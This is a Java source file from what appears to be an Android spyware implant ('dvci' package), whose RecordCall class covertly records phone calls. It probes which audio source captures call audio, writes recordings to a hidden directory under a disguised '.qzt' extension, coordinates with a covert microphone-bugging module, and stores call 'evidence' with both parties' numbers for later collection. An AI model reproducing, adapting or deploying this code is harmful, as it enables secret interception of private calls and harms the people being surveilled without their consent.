package com.android.dvci.module.call;

import java.io.File;
import java.util.HashMap;
import java.util.concurrent.TimeUnit;

import android.media.MediaRecorder;
import android.os.Build;

import com.android.dvci.Call;
import com.android.dvci.Core;
import com.android.dvci.Device;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.Markup;
import com.android.dvci.file.Path;
import com.android.dvci.module.ModuleCall;
import com.android.dvci.module.ModuleMic;
import com.android.dvci.util.Check;
import com.android.mm.M;

public class RecordCall {
	private static final String TAG = "RecordCall";
	
	static RecordCall singleton;
	protected static final int CALL_PHONE = 0x0145;
	private String currentRecordFile;
	// private Date fromTime;
	// private String number, model;
	private int strategy = 0;
	
	public synchronized static RecordCall self() {
		if (singleton == null) {
			singleton = new RecordCall();
		}

		return singleton;
	}
	
	private MediaRecorder recorder = null;
	

	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
		// Create dummy file
		Long ts = Long.valueOf(System.currentTimeMillis());
		String tmp = ts.toString();
		String path = Path.hidden() + tmp + ".qzt"; // file .3gp
		boolean success = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
		}

		startRecord(audioSource, outputFormat, audioEncoder, path);

		// Utils.sleep(250);

		stopRecord();

		File dummy = new File(path);

		if (dummy.length() > 0) {
			success = true;
		}

		dummy.delete();
		dummy = null;

		return success;
	}
	

	private int getStrategyNotYetWorking(ModuleCall module) {
		Markup markupCallStrategy = new Markup(module);
		HashMap<Integer, Boolean> strategyMap = null;

		// the markup exists, try to read it
		try {
			if (markupCallStrategy.isMarkup()) {
				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
			}

			// First time we run, let's try a strategy
			if (strategyMap == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
				}

				// Start with strategy 1
				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
				boolean res;

				strategyMap = new HashMap<Integer, Boolean>();

				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);

				// Strategy 0x04
				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
				}

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_CALL;
				}

				// Strategy 0x02
				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_UPLINK;
				}

				// Strategy 0x03
				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
				}

				// Strategy 0x01
				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
				}

				strategyMap.put(MediaRecorder.AudioSource.MIC, res);

				if (res == true) {
					markupCallStrategy.writeMarkupSerializable(strategyMap);
					return MediaRecorder.AudioSource.MIC;
				}

				markupCallStrategy.writeMarkupSerializable(strategyMap);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
				}
			} else { // Return the winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
				}

				for (Integer i : strategyMap.keySet()) {
					boolean testedStrategy = strategyMap.get(i);

					if (testedStrategy == true) {
						// Return the winning strategy
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
						}
						return i;
					}
				}

				// Ok we don't have a winning strategy
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
				}

				return 0;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
			}
		}

		return 0;
	}



	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
		recorder = new MediaRecorder();

		recorder.setAudioSource(audioSource);
		recorder.setOutputFormat(outputFormat);
		// REMOVE
		// recorder.setAudioChannels(1);

		recorder.setAudioEncoder(audioEncoder);
		recorder.setOutputFile(path);

		try {
			recorder.prepare();
			recorder.start();
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (startRecord) Error: cannot start recording");
			}

			recorder = null;
			return false;
		}

		currentRecordFile = path;
		return true;
	}

	private boolean stopRecord() {
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
			}

			return false;
		}

		recorder.stop();
		recorder.release();
		recorder = null;
		return true;
	}
	
	public boolean isSupported(ModuleCall module) {
		String model = Build.MODEL.toLowerCase();
		boolean supported = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
		}
		// TODO: in Messages
		if (model.contains(M.e("i9100"))) { // Samsung Galaxy S2
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy
															// Nexus
			supported = true;
			strategy = MediaRecorder.AudioSource.DEFAULT;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("gt-i9300"))) { // Galaxy S3
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("xt910"))) { // Motorola xt-910
			supported = false;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
			}
		} else if (model.contains(M.e("gt-p1000"))) { // Samsung Galaxy Tab 7''
			supported = true;
			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
			}
		}

		module.recordFlag = supported;
		return supported;
	}
	
	public boolean recordCall(final ModuleCall module, final Call call, final boolean incoming) {
		if (!call.isOngoing()) {
			if (stopRecord()) {
				Object future = Status.getStpe().schedule(new Runnable() {
					public void run() {
						String myNumber = Device.self().getPhoneNumber();
						module.saveCallEvidence(call.getNumber(), myNumber, incoming, call.getTimeBegin(), call.getTimeEnd(),
								currentRecordFile, true, 1, CALL_PHONE);
					}
				}, 100, TimeUnit.MILLISECONDS);

				// Se un giorno la conf non dovesse includere gia' tutti
				// i moduli,
				// self() tornerebbe NULL in quanto non instanziato.
				ModuleMic mic = ModuleMic.self();

				if (mic != null) {
					mic.resume();
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
			}

			return true;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
		}

		int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
		int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;

		Long ts = Long.valueOf(System.currentTimeMillis());
		String tmp = ts.toString();

		// Logfile .3gpp in chiaro, temporaneo
		String path = Path.hidden() + tmp + M.e(".qzt");

		ModuleMic mic = ModuleMic.self();

		if (mic != null) {
			mic.suspend();
		}

		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
			}

		} else {
			module.recordFlag = false;
		}

		mic = ModuleMic.self();

		if (mic != null) {
			mic.resume();
		}

		return false;
	}


}
